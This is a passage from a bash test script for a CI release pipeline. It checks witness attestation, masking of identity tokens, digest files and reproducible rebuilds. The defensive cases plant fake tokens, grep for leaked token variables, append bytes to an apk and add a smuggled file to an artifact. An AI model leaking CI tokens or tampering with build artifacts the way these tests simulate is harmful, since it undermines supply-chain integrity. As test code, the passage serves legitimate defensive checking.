printf '{"value":"FAKE-JWT-TOKEN-VALUE"}\n'
EOF
  cat > "$1/fake/timeout" <<'EOF'
#!/usr/bin/env bash
echo "timeout $1" >> calls.log
shift
"$@" & pid=$!
( sleep "${FAKE_TIMEOUT_SECONDS:-2}"; kill "$pid" 2> /dev/null ) & killer=$!
wait "$pid"; status=$?; kill "$killer" 2> /dev/null; exit $status
EOF
  chmod +x "$1"/bin/* "$1"/fake/*
}
helper_run() { # helper_run DIR STEP [ENV=VAL...] -> prints the exit status of `bash bin/witnessed.sh STEP bin/wrapped.sh`
  local dir=$1 step=$2; shift 2
  ( cd "$dir" && if env "$@" PATH="$dir/fake:$PATH" RUNNER_TEMP="$dir/tmp" ACTIONS_ID_TOKEN_REQUEST_TOKEN=SENTINEL-BEARER \
      ACTIONS_RUNTIME_TOKEN=SENTINEL-RUNTIME ACTIONS_RUNTIME_URL="https://runtime.example/y" \
      ACTIONS_ID_TOKEN_REQUEST_URL="https://pipelines.example/x?a=1" bash bin/witnessed.sh "$step" bin/wrapped.sh > helper.out 2> helper.err
      then echo 0
      else echo $?
      fi )
}
for tag in fixture real; do
  if [ "$tag" = fixture ]; then helper_script="$work/witnessed.sh"; else helper_script="$root/bin/witnessed.sh"; fi
  if [ ! -f "$helper_script" ]; then
    for l in "the command runs through witness with timeout 540 and the record is written" \
             "no token file exists while the wrapped command runs and the signer was given the token once" \
             "a command that outlives the (test) timeout fails the job and leaves no record and no digests.json" \
             "a failing command fails the job and leaves no record" "an unknown step name exits 2 before witness is called" \
             "the identity token appears only in the add-mask line" "the wrapped command's environment holds no identity-token variable"; do
      bad "AC2 $tag helper: $l (bin/witnessed.sh does not exist: RED until implemented)"
    done
    continue
  fi
  d="$work/h-$tag"; helper_tree "$d" "$helper_script"; rc=$(helper_run "$d" apk); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  if [ "$rc" = 0 ] && [ -f "$d/witness-apk/apk-collection.json" ] && grep -Fq -- '--step apk' <<< "$calls" \
     && grep -Fq -- '-- timeout 540 bash bin/wrapped.sh' <<< "$calls" && grep -Fxq 'timeout 540' <<< "$calls"; then
    ok "AC2 $tag helper: the command runs through witness with timeout 540 and the record is written"
  else
    bad "AC2 $tag helper: rc=$rc calls=$(tr '\n' '|' <<< "$calls" | cut -c1-200)"
  fi
  helper_tree "$d" "$helper_script"; rc=$(helper_run "$d" apk SLEEP=6 FAKE_TIMEOUT_SECONDS=1)
  if [ "$rc" != 0 ] && [ ! -e "$d/witness-apk/apk-collection.json" ] && [ ! -e "$d/digests.json" ]; then
    ok "AC2 $tag helper: a command that outlives the (test) timeout fails the job and leaves no record and no digests.json"
  else
    bad "AC2 $tag helper: slow command -> rc=$rc, files left: $(ls "$d/witness-apk" "$d/digests.json" 2> /dev/null | tr '\n' ' ')"
  fi
  helper_tree "$d" "$helper_script"; rc=$(helper_run "$d" apk WRAPPED_RC=3)
  if [ "$rc" != 0 ] && [ ! -e "$d/witness-apk/apk-collection.json" ]; then
    ok "AC2 $tag helper: a failing command fails the job and leaves no record"
  else
    bad "AC2 $tag helper: failing command -> rc=$rc"
  fi
  helper_tree "$d" "$helper_script"; rc=$(helper_run "$d" evil); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  if [ "$rc" = 2 ] && ! grep -q '^witness ' <<< "$calls"; then
    ok "AC2 $tag helper: an unknown step name exits 2 before witness is called"
  else
    bad "AC2 $tag helper: unknown step -> rc=$rc calls=$calls"
  fi
  helper_tree "$d" "$helper_script"; rc=$(helper_run "$d" apk); printed=$(cat "$d/helper.out" "$d/helper.err" 2> /dev/null || true)
  if [ "$(grep -c 'FAKE-JWT-TOKEN-VALUE' <<< "$printed" || true)" = 1 ] && grep 'FAKE-JWT-TOKEN-VALUE' <<< "$printed" | grep -q '^::add-mask::' \
     && ! grep -q SENTINEL-BEARER <<< "$printed"; then
    ok "AC2 $tag helper: the identity token appears only in the add-mask line and the bearer value is never printed"
  else
    bad "AC2 $tag helper: the token was printed more than in the add-mask line, or the bearer leaked"
  fi
  helper_tree "$d" "$helper_script"; rc=$(helper_run "$d" apk)
  if [ "$rc" = 0 ] && [ "$(cat "$d/signer-token.txt" 2> /dev/null)" = FAKE-JWT-TOKEN-VALUE ] && [ -f "$d/tokfiles-while-running.txt" ] \
     && [ ! -s "$d/tokfiles-at-start.txt" ] && [ ! -s "$d/tokfiles-while-running.txt" ] && [ -z "$(ls "$d/tmp" 2> /dev/null)" ] \
     && ! grep -q FAKE-JWT-TOKEN-VALUE "$d/wrapped-env.txt"; then
    ok "AC2 $tag helper: no token file exists while the wrapped command runs, the token is in no variable of its environment, and the signer got it"
  else
    bad \
        "AC2 $tag helper: a token file or variable is left for the wrapped command, or the signer got no token" \
        "(rc=$rc, files: $(ls "$d/tmp" 2> /dev/null | tr '\n' ' '))"
  fi
  if [ -f "$d/wrapped-env.txt" ] && ! grep -Eq \
      'ACTIONS_ID_TOKEN_REQUEST|ACTIONS_RUNTIME|SENTINEL-BEARER|SENTINEL-RUNTIME|pipelines.example|runtime.example' "$d/wrapped-env.txt";
  then
    ok "AC2 $tag helper: the wrapped command's environment holds neither the identity-token nor the runtime-token variables or values"
  else bad "AC2 $tag helper: the identity-token variables or their values reach the wrapped command"; fi
done
# ---- the stage scripts RUN against fake cache scripts (REQ-CHAIN-004-AC3, AC6, AC9; REQ-CHAIN-005-AC2) ---------------------------------------
# bin/chain-test-harness.py builds a throw-away tree; the expected digests.json and items.json come from its ORACLE, never from anything the
# implementation wrote. The fixtures run with the fake chain-verify.py (MODE oracle); the real scripts run with the REAL items-apk and items-merge
# (MODE real). Each function below covers one kind, so a wrong script fails its cases and the summary still prints.
script_of() { if [ "$1" = fixture ]; then echo "$work/s-$2.sh"; else echo "$root/bin/build-stage-$2.sh"; fi; }
mk() { python3 "$harness" mktree "$1" "$2" "$3" "$4" "$5" > /dev/null; }       # mk DIR KIND SCRIPT MODE TAG
with_timeout() { # with_timeout SECONDS COMMAND...   macOS has no timeout(1): a stuck stage must fail its case, never hang the test
  local seconds=$1 pid killer status; shift
  "$@" & pid=$!
  ( sleep "$seconds"; kill "$pid" 2> /dev/null ) & killer=$!
  wait "$pid" && status=0 || status=$?
  kill "$killer" 2> /dev/null; wait "$killer" 2> /dev/null || true
  return "$status"
}
run_stage() { # run_stage DIR KIND MODE TAG [ENV=VAL...] -> the exit status (124 if it hangs); GH_TOKEN is set as the apk job's Witness step sets it
  local dir=$1 kind=$2 mode=$3 tag=$4; shift 4
  ( cd "$dir" && if with_timeout 120 env "$@" GITHUB_REF_NAME="$tag" TAG="$tag" ITEMS_MODE="$mode" HARNESS_DIR="$root/bin" REAL_CV="$CV" \
        GITHUB_SHA=0123456789abcdef0123456789abcdef01234567 GH_TOKEN=SENTINEL-GH-TOKEN PATH="$dir/bin:$PATH" \
        bash "./bin/build-stage-$kind.sh" > stage.out 2> stage.err; then echo 0; else echo $?; fi )
}
n_calls() { grep -c -- "$1" "$2/calls.log" 2> /dev/null || true; }                         # n_calls REGEX DIR
line_of() { grep -n -- "$1" "$2/calls.log" 2> /dev/null | head -1 | cut -d: -f1 || true; }  # line_of REGEX DIR
json_of() { python3 -c 'import json,sys; print(json.dumps(json.load(open(sys.argv[1])), sort_keys=True))' "$1" 2> /dev/null || true; }
oracle() { python3 "$harness" "$@" 2> /dev/null || true; }
fails() { # fails DIR SCRIPT MODE TAG LABEL ENVVAR NOT-CALLED-REGEX   a stage that is made to fail must exit non-zero, leave no fragment, and not go on
  local d=$1 rc calls; mk "$d" apk "$2" "$3" "$4"; rc=$(run_stage "$d" apk "$3" "$4" "$6"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  if [ "$rc" != 0 ] && [ ! -e "$d/out/items-apk.json" ] && { [ -z "$7" ] || ! grep -Eq -- "$7" <<< "$calls"; }; then
    ok "AC6 apk: $5"
  else
    bad "AC6 apk: $5 -> rc=$rc calls=$(tr '\n' '|' <<< "$calls" | cut -c1-160)"
  fi
}
beh_apk() { # beh_apk TAGNAME SCRIPT MODE VERSIONTAG
  local t=$1 s=$2 mode=$3 v=$4 d="$work/b-apk-$1-$4" rc calls pk
  pk=$(oracle apkname standard "$v"); pk=${pk#fscache-}; pk=${pk%-r0.apk}
  mk "$d" apk "$s" "$mode" "$v"; rc=$(run_stage "$d" apk "$mode" "$v"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  if [ "$rc" = 0 ] && [ "$(sed -n 1p <<< "$calls")" = "admit gh=yes" ] && [ "$(n_calls '^apk ' "$d")" = 2 ] && [ "$(n_calls '^version ' "$d")" = 2 ]; then
    ok "AC3 $t apk $v: admission is the first call (and holds the token), then both variants build, then both version checks"
  else
    bad "AC3 $t apk $v: exit $rc, calls: $(tr '\n' '|' <<< "$calls" | cut -c1-200)"
  fi
  if grep -Fq "version standard $(oracle apkname standard "$v")" <<< "$calls" && grep -Fq "version fips $(oracle apkname fips "$v")" <<< "$calls" \
     && [ "$(n_calls "--version ${v#v} " "$d")" = 2 ]; then
    ok "AC3 $t apk $v: --version is the tag minus v (${v#v}) and the version check finds fscache-$pk-r0.apk and the fips apk (PROPOSED names)"
  else
    bad "AC3 $t apk $v: version or apk names: $(tr '\n' '|' <<< "$calls" | cut -c1-200)"
  fi
  if [ "$(n_calls 'SDE=1700000000' "$d")" = 2 ] && ! grep -q 'SDE=unset' "$d/calls.log"; then
    ok "AC6 $t apk $v: SOURCE_DATE_EPOCH (the tagged commit's time from cache's script) reaches both builds"
  else
    bad "AC6 $t apk $v: SOURCE_DATE_EPOCH not exported to both builds"
  fi
  if [ -f "$d/env-apk.txt" ] && ! grep -Eq '^(GH_TOKEN|APK_RELEASE_SIGNING_KEY|GOPROXY|HTTPS_PROXY|HTTP_PROXY|https_proxy)=' "$d/env-apk.txt" \
     && ! grep -q 'SENTINEL-GH-TOKEN' "$d/env-apk.txt"; then
    ok "AC6 $t apk $v: cache's script sees no GH_TOKEN (not the name, not the value) and none of the variables it refuses"
  else
    bad "AC6 $t apk $v: GH_TOKEN or a refused variable reached build-apk.sh"
  fi
  if [ "$(json_of "$d/out/items-apk.json")" = "$(oracle fragment "$(uname -m)" "$v")" ]; then
    ok "AC9 $t apk $v: out/items-apk.json (inside the uploaded directory) is exactly the oracle's fragment"
  else
    bad "AC9 $t apk $v: out/items-apk.json differs from the oracle"
  fi
  if [ "$v" = v0.3.0 ]; then
    fails "$d" "$s" "$mode" "$v" "a refused admission runs nothing else (no build, no version check)" FAKE_ADMIT_RC=1 '^apk |^version '
    fails "$d" "$s" "$mode" "$v" "a failing --print-source-date-epoch stops the job before any build (the export cannot mask it)" FAKE_SDE_RC=1 '^apk '
    fails "$d" "$s" "$mode" "$v" "build-apk.sh exit 2 (a named refusal) stops before the version checks" FAKE_APK_RC=2 '^version '
    fails "$d" "$s" "$mode" "$v" "build-apk.sh exit 4 (a network attempt in the sealed call) stops before the version checks" FAKE_APK_RC=4 '^version '
    fails "$d" "$s" "$mode" "$v" "a refused version check fails the job and leaves no items fragment" FAKE_VERSION_RC=1 ''
  fi
}
beh_assemble() { # beh_assemble TAGNAME SCRIPT MODE VERSIONTAG
  local t=$1 s=$2 mode=$3 v=$4 d="$work/b-asm-$1-$4" rc calls nv nb ni gd gi
  mk "$d" assemble "$s" "$mode" "$v"; rc=$(run_stage "$d" assemble "$mode" "$v"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  nv=$(line_of 'verify verify --stage build' "$d"); nb=$(line_of 'verify bind ' "$d"); ni=$(line_of '^image ' "$d")
  if [ "$rc" = 0 ] && [ "$(n_calls 'verify verify --stage build' "$d")" = 2 ] && [ "$(n_calls 'verify bind --step apk' "$d")" = 2 ] && [ -n "$nv" ] \
     && [ -n "$nb" ] && [ -n "$ni" ] && [ "$nv" -lt "$nb" ] && [ "$nb" -lt "$ni" ]; then
    ok "AC3 $t assemble $v: both records are verified, then both artifact directories are bound, then the repo is built, then the images"
  else
    bad "AC3 $t assemble $v: rc=$rc verify=$nv bind=$nb image=$ni"
  fi
  if [ "$(n_calls 'SDE=1700000000' "$d")" = 3 ] && ! grep -q 'SDE=unset' "$d/calls.log"; then
    ok "AC6 $t assemble $v: SOURCE_DATE_EPOCH reaches both image builds and the archives"
  else
    bad "AC6 $t assemble $v: SOURCE_DATE_EPOCH missing on an image build or the archives"
  fi
  if [ -f "$d/melange-repo/x86_64/$(oracle apkname standard "$v")" ] && [ -d "$d/melange-repo/aarch64" ]; then
    ok "AC3 $t assemble $v: the melange repo holds both architectures' apks, each from its own verified directory"
  else
    bad "AC3 $t assemble $v: the melange repo is incomplete"
  fi
  gd=$(json_of "$d/digests.json"); gi=$(json_of "$d/items.json")
  if [ "$rc" = 0 ] && [ "$gd" = "$(oracle expect "$d" assemble digests "$v")" ] && [ -n "$gd" ]; then
    ok "AC9 $t assemble $v: digests.json is exactly the oracle's (2 images, 4 apks by apk-tool digest, 4 archives)"
  else
    bad "AC9 $t assemble $v: rc=$rc digests.json differs from the oracle (got '${gd:0:100}')"
  fi
  if [ "$rc" = 0 ] && [ "$gi" = "$(oracle expect "$d" assemble items "$v")" ] && [ -n "$gi" ]; then
    ok "AC9 $t assemble $v: items.json is exactly the oracle's 29 items"
  else
    bad "AC9 $t assemble $v: rc=$rc items.json differs from the oracle (got '${gi:0:100}')"
  fi
  if [ -n "$gd" ] && python3 - "$d" <<'PY'
import json, re, sys
digests = json.load(open(sys.argv[1] + "/digests.json")); items = json.load(open(sys.argv[1] + "/items.json"))
assert len(digests) == 10, "digests.json must hold exactly the ten digests"
for name, value in digests.items():             # PR 1's schema (REQ-CHAIN-001-AC2): names [a-z0-9-]+, values sha256 and 64 lower-case hex
    assert re.fullmatch(r"[a-z0-9-]+", name) and re.fullmatch(r"sha256:[0-9a-f]{64}", value), name
    item = name.replace("-amd64", "-x86_64").replace("-arm64", "-aarch64") if name.startswith("apk-") else name
    assert items[item] == value, name
PY
  then ok "AC9 $t assemble $v: digests.json passes PR 1's schema and equals items.json for the same names"
  else bad "AC9 $t assemble $v: digests.json off-schema or unequal to items.json"
  fi
  if [ "$v" = v0.3.0 ]; then
    mk "$d" assemble "$s" "$mode" "$v"; rc=$(run_stage "$d" assemble "$mode" "$v" FAKE_VERIFY_RC=1); calls=$(cat "$d/calls.log" 2> /dev/null || true)
    if [ "$rc" != 0 ] && ! grep -q '^image ' <<< "$calls" && [ ! -e "$d/digests.json" ]; then
      ok "AC3 $t assemble: a refused apk record stops the job before any image"
    else
      bad "AC3 $t assemble: refused record -> rc=$rc"
    fi
    mk "$d" assemble "$s" "$mode" "$v"
    printf 'tampered' >> "$d/apk/ubuntu-24.04-arm/aarch64/fscache-0.3.0-r0.apk"
    rc=$(run_stage "$d" assemble "$mode" "$v")
    calls=$(cat "$d/calls.log" 2> /dev/null || true)
    if [ "$rc" != 0 ] && ! grep -q '^image ' <<< "$calls" && [ ! -e "$d/digests.json" ]; then
      ok "AC3 $t assemble: an apk whose bytes differ from the verified record stops the job before any image (rule 58)"
    else
      bad "AC3 $t assemble: tampered apk -> rc=$rc"
    fi
    mk "$d" assemble "$s" "$mode" "$v"; printf 'extra' > "$d/apk/ubuntu-24.04/x86_64/smuggled.apk"; rc=$(run_stage "$d" assemble "$mode" "$v")
    if [ "$rc" != 0 ] && [ ! -e "$d/digests.json" ]; then
      ok "AC3 $t assemble: a file in the artifact that the record does not hold stops the job"
    else
      bad "AC3 $t assemble: smuggled file -> rc=$rc"
    fi
    mk "$d" assemble "$s" "$mode" "$v"; rc=$(run_stage "$d" assemble "$mode" "$v" FAKE_IMAGE_RC=4)
    if [ "$rc" != 0 ] && [ ! -e "$d/digests.json" ] && [ ! -e "$d/items.json" ]; then
      ok "AC6 $t assemble: assemble-image.sh failing (exit 4) leaves no digests.json"
    else
      bad "AC6 $t assemble: image failure -> rc=$rc"
    fi
  fi
}
beh_rebuild_apk() { # beh_rebuild_apk TAGNAME SCRIPT MODE VERSIONTAG
  local t=$1 s=$2 mode=$3 v=$4 d="$work/b-rba-$1-$4" rc calls ns nb
  mk "$d" rebuild-apk "$s" "$mode" "$v"; rc=$(run_stage "$d" rebuild-apk "$mode" "$v"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  ns=$(line_of 'verify stage-start' "$d"); nb=$(line_of '^apk ' "$d")
  if [ "$rc" = 0 ] && [ -n "$ns" ] && [ -n "$nb" ] && [ "$ns" -lt "$nb" ] && [ "$(n_calls 'SDE=1700000000' "$d")" = 2 ] \
     && [ -f "$d/out/items-apk.json" ]; then
    ok "005-AC2 $t rebuild-apk $v: Build's record is verified FIRST, then the same builds with the same date, then the fragment"
  else
    bad "005-AC2 $t rebuild-apk $v: rc=$rc stage-start=$ns build=$nb"
  fi
  if [ "$v" = v0.3.0 ]; then
    mk "$d" rebuild-apk "$s" "$mode" "$v"; rc=$(run_stage "$d" rebuild-apk "$mode" "$v" FAKE_VERIFY_RC=1); calls=$(cat "$d/calls.log" 2> /dev/null || true)
    if [ "$rc" != 0 ] && ! grep -q '^apk ' <<< "$calls"; then
      ok "005-AC2 $t rebuild-apk: a refused Build record runs no build"
    else
      bad "005-AC2 $t rebuild-apk: refused record -> rc=$rc"
    fi
  fi
}
beh_rebuild_assemble() { # beh_rebuild_assemble TAGNAME SCRIPT MODE VERSIONTAG
  local t=$1 s=$2 mode=$3 v=$4 d="$work/b-rbs-$1-$4" rc calls n1 n2 n3 n4 n5 n6
  mk "$d" rebuild-assemble "$s" "$mode" "$v"; rc=$(run_stage "$d" rebuild-assemble "$mode" "$v"); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  n1=$(line_of 'verify verify ' "$d")
  n2=$(line_of 'verify stage-start' "$d")
  n3=$(line_of 'verify bind ' "$d")
  n4=$(line_of '^image ' "$d")
  n5=$(line_of 'verify items-merge' "$d")
  n6=$(line_of 'verify rebuild-compare' "$d")
  if [ "$rc" = 0 ] && [ -n "$n1" ] && [ -n "$n2" ] && [ -n "$n3" ] && [ -n "$n4" ] && [ -n "$n5" ] && [ -n "$n6" ] && [ "$n1" -lt "$n2" ] \
     && [ "$n2" -lt "$n3" ] && [ "$n3" -lt "$n4" ] && [ "$n4" -lt "$n5" ] && [ "$n5" -lt "$n6" ]; then
    ok "005-AC2 $t rebuild-assemble $v: records verified, stage-start, binds, images, merge, compare in that order"
  else
    bad "005-AC2 $t rebuild-assemble $v: rc=$rc order=$n1 $n2 $n3 $n4 $n5 $n6"
  fi
  if [ "$rc" = 0 ] && jq -e '.equal == true' "$d/witness-rebuild/verdict.json" > /dev/null 2>&1; then
    ok "005-AC3 $t rebuild-assemble $v: an identical rebuild writes an equal verdict"
  else
    bad "005-AC3 $t rebuild-assemble $v: rc=$rc verdict=$(head -c 100 "$d/witness-rebuild/verdict.json" 2> /dev/null)"
  fi
  if [ "$v" = v0.3.0 ]; then
    mk "$d" rebuild-assemble "$s" "$mode" "$v"
    python3 - "$d/build-in/items.json" <<'PY'
import json, sys
p = sys.argv[1]; items = json.load(open(p)); k = "image-fips"; items[k] = items[k][:-1] + ("0" if items[k][-1] != "0" else "1"); json.dump(items, open(p, "w"))
PY
    rc=$(run_stage "$d" rebuild-assemble "$mode" "$v")
    if [ "$rc" != 0 ] && jq -e '.equal == false' "$d/witness-rebuild/verdict.json" > /dev/null 2>&1 && grep -q 'image-fips' "$d/stage.err"; then
      ok "005-AC3 $t rebuild-assemble: a differing Build item blocks the job and the verdict names it"
    else
      bad "005-AC3 $t rebuild-assemble: differing item -> rc=$rc"
    fi
    mk "$d" rebuild-assemble "$s" "$mode" "$v"
    rc=$(run_stage "$d" rebuild-assemble "$mode" "$v" FAKE_VERIFY_RC=1)
    calls=$(cat "$d/calls.log" 2> /dev/null || true)
    if [ "$rc" != 0 ] && ! grep -q '^image ' <<< "$calls"; then
      ok "005-AC2 $t rebuild-assemble: a refused record stops the job before any image"
    else
      bad "005-AC2 $t rebuild-assemble: refused record -> rc=$rc"
    fi
  fi
}
cases_of() { case "$1" in apk) echo 15;; assemble) echo 16;; rebuild-apk) echo 3;; rebuild-assemble) echo 6;; esac; }    # cases one kind runs for both versions
for tag in fixture real; do
  mode=oracle; [ "$tag" = real ] && mode=real
  for kind in apk assemble rebuild-apk rebuild-assemble; do
    n=$(cases_of "$kind")
    if [ ! -f "$(script_of "$tag" "$kind")" ]; then      # a missing script is as many failed cases as the script would have run, so the total never shrinks
      for _ in $(seq "$n"); do bad "AC3 $tag $kind: a behaviour case (bin/build-stage-$kind.sh does not exist: RED until implemented)"; done
      continue
    fi
    before=$((pass + failn))
    for version in v0.3.0 v0.3.0-rc.1; do "beh_$(tr - _ <<< "$kind")" "$tag" "$(script_of "$tag" "$kind")" "$mode" "$version"; done
    [ $((pass + failn - before)) = "$n" ] || bad "the $kind behaviour cases ran $((pass + failn - before)) cases, cases_of says $n"
  done
done
# the harness itself can fail: (1) a script that ignores a refused admission is visible; (2) a script without its stage-start line fails its cases and the
# summary still prints (a wrong implementation must not abort the test: every counting command above is safe under set -e)
mk "$work/ctl" apk "$work/s-apk.sh" oracle v0.3.0
sed -i.bak 's/^\(python3 bin\/build-admit\.py run\)$/\1 || true/' "$work/ctl/bin/build-stage-apk.sh"
rm -f "$work/ctl/bin/build-stage-apk.sh.bak"
rc=$(run_stage "$work/ctl" apk oracle v0.3.0 FAKE_ADMIT_RC=1)
if [ "$rc" = 0 ] || [ "$(n_calls '^apk ' "$work/ctl")" != 0 ]; then
  ok "control: a script that ignores a refused admission is visible to the behaviour cases (exit $rc, a build ran)"
else
  bad "control: the ignoring script was NOT visible (exit $rc)"
fi
grep -v 'stage-start' "$work/s-rebuild-assemble.sh" > "$work/ctl-ra.sh"; before_pass=$pass; before_fail=$failn
beh_rebuild_assemble control "$work/ctl-ra.sh" oracle v0.3.0 > /dev/null
new_fail=$((failn - before_fail)); pass=$before_pass; failn=$before_fail
if [ "$new_fail" -gt 0 ]; then
  ok "control: a rebuild-assemble script without its stage-start line fails $new_fail behaviour cases and the test still reaches its summary"
else
  bad "control: the script without stage-start passed every behaviour case"
fi
# ---- the real repository --------------------------------------------------------------------------------------------------------------------
RAL="$root/.github/policy/allowed-actions.json"
expect ok "AC1/AC2 the real stage-build.yml is exactly the Build grammar" "" stage "$root/.github/workflows/stage-build.yml" build "$RAL"
expect ok "005-AC1/AC4 the real stage-reproducibility.yml is exactly the Rebuild grammar" "" stage "$root/.github/workflows/stage-reproducibility.yml" \
       rebuild "$RAL"
for k in $KINDS; do expect ok "AC3/005-AC2 the real bin/build-stage-$k.sh is exactly the grammar" "" script "$root/bin/build-stage-$k.sh" "$k"; done
expect ok "AC2 the real bin/witnessed.sh is exactly the canonical helper" "" helper "$root/bin/witnessed.sh"
expect ok "AC2 no real stage file or stage script names witness run" "" directwitness "$root/.github/workflows/stage-build.yml" \
       "$root/.github/workflows/stage-reproducibility.yml" "$root"/bin/build-stage-*.sh
expect ok "AC3 the five real scripts are rows of .github/policy/chain-scripts.json with their sha256" "" listed \
       "$root/.github/policy/chain-scripts.json" "$root"
expect ok "005-AC5 the real release.yml chain jobs" "" graph "$root/.github/workflows/release.yml"
expect ok "AC11/005-AC6 the real Build and Rebuild assemble scripts agree and the real stage files do not name apko" "" lockflow \
       "$root/bin/build-stage-assemble.sh" "$root/bin/build-stage-rebuild-assemble.sh" "$root/.github/workflows/stage-build.yml" \
       "$root/.github/workflows/stage-reproducibility.yml"
expect ok "AC1 the real workflow directory: no file added beyond stage-sign.yml, stage-image.yml and stage-admission.yml gone (rules 50, 52, 61)" "" \
       workflows "$root/.github/workflows"
EXPECT=362
echo "pass=$pass fail=$failn"
if [ "$EXPECT" != 0 ] && [ $((pass + failn)) != "$EXPECT" ]; then
  echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1
fi
[ "$failn" = 0 ]
